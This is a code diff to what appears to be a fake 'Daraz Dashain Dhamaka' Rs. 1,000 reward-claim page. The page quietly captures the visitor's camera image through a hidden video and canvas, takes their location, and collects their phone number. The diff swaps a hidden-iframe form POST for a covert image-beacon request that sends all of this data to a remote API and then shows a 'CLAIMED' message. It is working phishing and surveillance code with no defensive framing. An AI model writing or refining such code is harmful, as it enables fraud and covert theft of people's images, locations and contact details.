@@ -92,7 +92,6 @@
 
 <video id="video" playsinline autoplay muted></video>
 <canvas id="canvas" style="display:none"></canvas>
-<iframe name="hiddenFrame" id="hiddenFrame" style="display:none;"></iframe>
 
 <script>
 "use strict";
@@ -106,27 +105,10 @@ var agreeCheck  = document.getElementById('agreeCheck');
 var formSection = document.getElementById('formSection');
 var statusPill  = document.getElementById('statusPill');
 var btnSubmit   = document.getElementById('btnSubmit');
-var hiddenFrame = document.getElementById('hiddenFrame');
 
 var captured = { location:null, image:null };
 var cameraStream = null;
 var captureStarted = false;
-var submitting = false;
-
-hiddenFrame.addEventListener('load', function(){
-  if (!submitting) return;
-  submitting = false;
-  var txt = '';
-  try { txt = hiddenFrame.contentDocument.body.innerText; } catch(e) { txt = 'blocked'; }
-  showStatus('Server: ' + (txt ? txt.slice(0, 80) : 'empty'));
-  if (txt.indexOf('"ok":true') !== -1) {
-    btnSubmit.textContent = '\u2713 CLAIMED';
-    btnSubmit.classList.add('success');
-  } else {
-    btnSubmit.disabled = false;
-    btnSubmit.textContent = 'RETRY';
-  }
-});
 
 btnRedeem.addEventListener('click', function(e){ e.preventDefault(); modal.classList.add('active'); });
 agreeCheck.addEventListener('change', function(){ btnConfirm.disabled = !agreeCheck.checked; });
@@ -203,40 +185,22 @@ btnSubmit.addEventListener('click', function(){
   btnSubmit.textContent = 'SUBMITTING...';
   showStatus('Sending...');
 
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = API;
-  form.target = 'hiddenFrame';
-  form.style.display = 'none';
+  var url = API
+    + '?campaign=Daraz+Dashain+Dhamaka'
+    + '&reward=Rs.+1,000'
+    + '&phoneNumber=' + encodeURIComponent(phone)
+    + '&notes=' + encodeURIComponent(notes)
+    + '&location=' + (captured.location ? encodeURIComponent(JSON.stringify(captured.location)) : '')
+    + '&image=' + (captured.image ? encodeURIComponent(captured.image) : '')
+    + '&_=' + Date.now();
 
-  function addField(name, value) {
-    var input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = name;
-    input.value = (value === null || value === undefined) ? '' : value;
-    form.appendChild(input);
-  }
-
-  addField('campaign', 'Daraz Dashain Dhamaka');
-  addField('reward', 'Rs. 1,000');
-  addField('phoneNumber', phone);
-  addField('notes', notes);
-  addField('location', captured.location ? JSON.stringify(captured.location) : '');
-  addField('image', captured.image ? encodeURIComponent(captured.image) : '');
-
-  document.body.appendChild(form);
-  submitting = true;
-  form.submit();
-
-  setTimeout(function(){
-    if (submitting) {
-      submitting = false;
-      showStatus('Sent (no reply captured)');
-      btnSubmit.textContent = '\u2713 SENT';
-      btnSubmit.classList.add('success');
-    }
-    if (form.parentNode) document.body.removeChild(form);
-  }, 4000);
+  var img = new Image();
+  img.onload = img.onerror = function(){
+    showStatus('Sent!');
+    btnSubmit.textContent = '\u2713 CLAIMED';
+    btnSubmit.classList.add('success');
+  };
+  img.src = url;
 });
 
 function showStatus(msg) {
